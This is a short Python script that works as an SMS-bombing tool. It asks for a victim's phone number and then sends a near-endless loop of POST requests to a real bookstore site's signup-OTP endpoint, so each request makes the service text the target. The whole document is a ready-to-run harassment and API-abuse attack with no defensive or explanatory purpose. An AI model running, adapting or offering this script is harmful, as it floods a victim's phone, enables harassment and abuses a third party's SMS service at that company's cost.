import requests
import time 


number=str(input("\[>]	Enter Your Target Number: "))
sms=str(input("\[>]	Write Message: "))

url = "https://boichitro.com.bd/api/v1/auth/send-signup-otp/"


headers = {"content-type":"application/json; charset=utf-8"}


data='{"phone":"+88'+number+'","app_key":"'+sms+'"}'
for i in range(50000000000004638383672727372736272):
	try:	
		x = requests.post(url, headers=headers, data=data)
		
		
		print("\t\t\t"+str([ i+1])+"\n"+x.text)
	except:
		print(" make sure your internet connection")